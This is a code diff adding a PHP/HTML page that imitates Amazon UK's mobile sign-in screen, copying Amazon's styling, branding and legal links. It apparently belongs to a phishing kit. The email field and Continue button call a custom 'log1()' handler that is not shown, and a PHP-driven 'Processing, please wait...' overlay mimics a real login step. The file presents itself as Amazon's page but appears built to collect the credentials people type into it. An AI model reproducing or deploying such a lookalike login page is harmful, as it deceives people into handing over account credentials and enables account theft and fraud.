@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en-GB" class="a-no-js a-touch a-mobile" data-19ax5a9jf="mongoose">
+
+<head>
+  <script type='text/javascript'>var ue_t0 = ue_t0 || +new Date();</script>
+
+  <!-- 4h4levydy222zps8veczyaqt7mu1asdt8lot7qlkttx -->
+  <script>window.ue && ue.count && ue.count('CSMLibrarySize', 10186)</script>
+  <script>var aPageStart = (new Date()).getTime();</script>
+  <meta name="viewport"
+    content="width=device-width, maximum-scale=2, minimum-scale=1, initial-scale=1, shrink-to-fit=no" />
+  <meta charset="utf-8" />
+
+  <title dir="ltr">Amazon Sign In</title>
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, user-scalable=yes" />
+  <link rel="stylesheet" href="assets/css/style.css">
+
+
+  <link rel="stylesheet"
+    href="https://images-eu.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01rXlRztnIL.css,51ljwD9qZCL.css,313tLGwI6hL.css,11X2Gl5U7ZL.css,01Brx6+fBpL.css,01pOTCa2wPL.css,31VtExXv3+L.css,11o2wHvvdBL.css,01xgFoPPxUL.css,11eSwlQMlDL.css,11e-jbzryEL.css,01IdKcBuAdL.css,01upCsvPEjL.css,01wLsDqViEL.css,11AHY1vTq0L.css,01Z1UlsVFAL.css,51aOuho6XrL.css,012dON--upL.css,21wMtK6TUXL.css,01MrXD2tOrL.css,0113BWbfoVL.css,21fdp+g-0FL.css,11rALzPecdL.css,21-iBSvMyzL.css,110ftCLbqYL.css,21M+GHBlesL.css,01CFUgsA-YL.css,31bSHYm1mvL.css,01TrIleQbxL.css,117-Ua1lcCL.css,21-jHVhSRZL.css,11Oxk4dAX5L.css,01E2zzMI+eL.css,01+tfi8SNqL.css,21Mh4pI67BL.css,11VgqymQT5L.css,01jQEejun1L.css,21BRK9jPaFL.css,11ONCkbtp2L.css,11sWY5Ho7rL.css,11RmzXz5xwL.css,01890+Vwk8L.css,11jdRgSyK5L.css,011xCdCXnXL.css,01qiwJ7qDfL.css,217foNnRnbL.css,01tkNT3LUNL.css,01IZnxRVZUL.css,21F9OPpFCAL.css,01nOZ8FJ+WL.css_.css?AUIClients/AmazonUI#mobile.gb.not-trident" />
+  <link rel="stylesheet"
+    href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51y7m2K65yL.css_.css?AUIClients/AuthenticationPortalAssets&QmmAyoMU#mobile.194821-T1" />
+  <link rel="stylesheet"
+    href="https://images-eu.ssl-images-amazon.com/images/I/21Tw7TldARL.css?AUIClients/CVFAssets#mobile" />
+
+
+
+
+
+
+  <script type="a-state"
+    data-a-state="{&quot;key&quot;:&quot;sif-encryption-profile&quot;}">{"sifProfile":"AuthenticationPortalSigninEU"}</script>
+  <script type="text/javascript" async
+    src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninEU.js"></script>
+
+  <script>window.ue && ue.count && ue.count('CSMLibrarySize', 3172)</script>
+</head>
+
+
+<body
+  class="a-color-offset-background ap-locale-en_GB a-m-us a-aui_72554-c a-aui_a11y_6_837773-c a-aui_killswitch_csa_logger_372963-t1 a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c">
+  <?php if ($hideStyle == 'loading'): ?>
+    <div
+      style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000;">
+      <div
+        style="width: 56px; height: 56px; border: 6px solid #e7e9ec; border-top: 6px solid #ff9900; border-radius: 50%; animation: amazon-spin 1s linear infinite;">
+      </div>
+      <p style="color: #111; font-family: 'Amazon Ember', Arial, sans-serif; margin-top: 24px; font-size: 1.1em;">
+        Processing, please wait...
+      </p>
+    </div>
+    <style>
+      @keyframes amazon-spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  <?php endif; ?>
+  <script>window.ue && ue.count && ue.count('CSMLibrarySize', 18541)</script>
+  <div id="a-page">
+    <script type="a-state"
+      data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_KILLSWITCH_CSA_LOGGER_372963":"T1"}</script>
+    <div class="a-section a-spacing-none"> <!-- NAVYAAN CSS -->
+      <meta name="theme-color" content="#131921" />
+      <style type="text/css">
+        .nav-sprite-v3 .nav-sprite {
+          background-image: url(https://m.media-amazon.com/images/G/02/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB541706988_.png);
+          background-repeat: no-repeat;
+        }
+
+        .nav-spinner {
+          background-image: url(https://m.media-amazon.com/images/G/02/javascripts/lib/popover/images/snake._CB485935565_.gif);
+        }
+      </style>
+      <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/51aQKvI4MVL._RC|51-Y6keNmXL.css,51WpfqgpRJL.css_.css?AUIClients/NavMobileAssets-all#778344-T1" />
+      <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/41Q63wvCUzL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets" />
+      <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile.1253326-T1" />
+      <link rel="stylesheet"
+        href="https://images-eu.ssl-images-amazon.com/images/I/5187GbU4wYL._RC|410hTC0Hb+L.css,01FcI3FsaiL.css,31X9kJ6OojL.css_.css?AUIClients/RetailSearchAutocompleteAssets#mobile" />
+      <img
+        src="https://m.media-amazon.com/images/G/02/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB541706988_.png"
+        style="display:none" alt="" />
+      <script type="text/javascript">var nav_t_after_preload_sprite = + new Date();</script> <!-- NAVYAAN -->
+      <!-- navmet initial definition -->
+      <style mark="aboveNavInjectionCSS" type="text/css">
+        .nav-input[type='submit'] {
+          opacity: 0.01;
+        }
+      </style>
+      <script
+        type='text/javascript'>window.navmet.push({ key: 'AboveNavInjection', end: +new Date(), begin: window.navmet.tmp });</script>
+      <script type='text/javascript'> window.uet && uet('ns'); </script>
+      <script
+        type='text/javascript'>window.navmet.push({ key: 'MobileNavConfig', end: +new Date(), begin: window.navmet.tmp });</script>
+
+      <header id="nav-main" data-nav-language=en_GB
+        class="nav-mobile nav-progressive-attribute nav-locale-gb nav-lang-en nav-ssl nav-unrec nav-blueheaven">
+        <div id="navbar" cel_widget_id='Navigation-mobile-navbar' role="navigation"
+          class="nav-t-basicNoAuth nav-sprite-v3 celwidget">
+          <div id="nav-logobar">
+            <div class="nav-left">
+              <div id="nav-logo"> <a href="/ref=navm_hdr_logo" id="nav-logo-sprites"
+                  class="nav-logo-link nav-progressive-attribute"  lang="en"> <span
+                    class="nav-sprite nav-logo-base"></span> <span id="logo-ext"
+                    class="nav-sprite nav-logo-ext nav-progressive-content"></span> <span
+                    class="nav-logo-locale">.co.uk</span> </a> </div>
+            </div>
+            <div class="nav-right" style="justify-content: center;align-content: center;">
+              <div class="nav-profile-icon" style="position:absolute; right:16px; top:50%; transform:translateY(-50%);">
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="nav-progressive-subnav"> </div>
+      </header>
+
+    </div>
+    <div class="a-container">
+      <div class="a-section a-spacing-none"> </div>
+      <div class="a-section a-spacing-none auth-pagelet-mobile-container"> </div>
+      <div class="a-section auth-pagelet-mobile-container">
+
+        <div id="outer-accordion-signin-signup-page" class="a-section">
+
+          <h2 id="accordion_group_heading" style="margin-top: 10px; margin-bottom: 10px;"> Welcome </h2>
+          <div id="accordion-signin-signup-page" aria-activedescendant="login_accordion_header"
+            aria-labelledby="login_accordion_header register_accordion_header"
+            data-a-accordion-name="accordion-signin-signup-page"
+            class="a-box-group a-accordion a-spacing-medium a-spacing-top-mini" role="radioGroup">
+
+            <!-- Variables for signin -->
+            <div id="accordion-row-login" class="a-box a-accordion-active"
+              data-a-accordion-row-name="accordion-row-login" style="padding-top: 20px;">
+              <div class="a-box-inner a-accordion-row-container">
+
+                <div class="a-accordion-inner" id="a-accordion-auto-6">
+                  <div class="a-section" style="margin-bottom: 15px;">
+                    <p class="a-form-label" style="font-size: 16px;">Sign in</p>
+                  </div>
+
+                  <div class="a-section a-spacing-base">
+                    <label class="a-form-label">Email or phone number *</label>
+                    <input type="text" id="user-em" class="a-input-text a-span12" required>
+                  </div>
+
+                  <div class="a-section" role="button">
+                    <span role="button" class="a-button a-button-span12 a-button-primary">
+                      <span class="a-button-inner">
+                        <input id="continue" aria-describedby="legalTextRow" class="a-button-input"
+                          aria-labelledby="continue-announce" onclick="log1()" />
+                        <span id="continue-announce" class="a-button-text" aria-hidden="true"> Continue </span>
+                      </span>
+                    </span>
+                  </div>
+
+                  <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small"> By continuing,
+                    you agree to Amazon's <a
+                      href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=1040616">Conditions
+                      of Use &amp; Sale</a>. Please see our <a
+                      href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=502584">Privacy
+                      Notice</a>, our <a href="/gp/help/customer/display.html/?nodeId=201890250">Cookies
+                      Notice</a> and our <a href="/gp/help/customer/display.html?nodeId=201909150">Interest-Based
+                      Ads Notice</a>. </div>
+
+                  <div id="ab-signin-link-section" class="a-section" style="margin-top: 20px;">
+                    <hr aria-hidden="true" class="a-divider-normal" />
+                    <div class="a-section a-spacing-micro"> <span class="a-text-bold">
+                        Buying for work? </span> </div> <a id="ab-signin-ingress-link" class="a-link-normal"
+                      href="https://www.amazon.co.uk/business/register/welcome?ref_=ab_reg_signin">
+                      <span> Shop on Amazon Business </span> </a>
+                  </div>
+
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <footer class="nav-mobile nav-ftr-batmobile">
+        <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
+          <div class="icp-container-mobile">
+            <style type="text/css">
+              #icp-touch-link-cop {
+                display: none;
+              }
+            </style> <a href="/customer-preferences/edit?ie=UTF8&ref_=footer_cop&preferencesReturnUrl=%2Fap%2Fsignin"
+              class="icp-touch-link-2" id="icp-touch-link-cop"> <span class="icp-currency-symbol">£</span><span
+                class="icp-color-base">GBP - Pounds</span> </a>
+            <style type="text/css">
+              #icp-touch-link-country {
+                display: none;
+              }
+            </style> <a href="/customer-preferences/country?ie=UTF8&preferencesReturnUrl=%2F&ref_=navm_footer_icp_cp"
+              role="button" aria-label="Choose a country/region for shopping. The current selection is United Kingdom."
+              class="icp-touch-link-2" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-gb"></span><span
+                class="icp-color-base">United Kingdom</span> </a>
+          </div>
+          <ul class="nav-ftr-horiz">
+            <li class="nav-li"> <a href="/gp/help/customer/display.html?nodeId=201909000&ref_=navm_ftr_cou" id=""
+                class="nav-a">Conditions of Use</a> </li>
+            <li class="nav-li"> <a href="/gp/help/customer/display.html?nodeId=201909010&ref_=navm_ftr_mpa" id=""
+                class="nav-a">Privacy Notice</a> </li>
+            <li class="nav-li"> <a href="/gp/help/customer/display.html?nodeId=201890250&ref_=navm_ftr_cookies_notice"
+                id="" class="nav-a">Cookies Notice</a> </li>
+            <li class="nav-li"> <a href="/gp/help/customer/display.html?nodeId=201909150&ref_=navm_ftr_iba" id=""
+                class="nav-a">Interest-Based Ads Notice</a> </li>
+          </ul>
+          <div id="nav-ftr-copyright"> &copy; 1996-2025, Amazon.com, Inc. or its affiliates </div>
+          <div id="nav-ftr-legal"> </div>
+        </div>
+      </footer>
+      <div id="sis_pixel_r2" aria-hidden="true"
+        style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"></div>
+      <!-- NAVYAAN BTF END -->
+    </div>
+    <script type="text/javascript"> window.fwcimCmd = [['profile', 'signIn']]; </script> <!--ACICSetup-->
+    <!-- cache slot rendered -->
+  </div>
+  <div id='be' style="display:none;visibility:hidden;">
+    <form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form>
+  </div> <noscript> <img height="1" width="1" style='display:none;visibility:hidden;'
+      src='//fls-eu.amazon.com/1/batch/1/OP/A1F83G8C2ARO7P:260-3026589-1539513:27S4ETPMEEKRBMTZ1JTA$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3D27S4ETPMEEKRBMTZ1JTA:0'
+      alt="" /> </noscript>
+</body>
+
+</html>
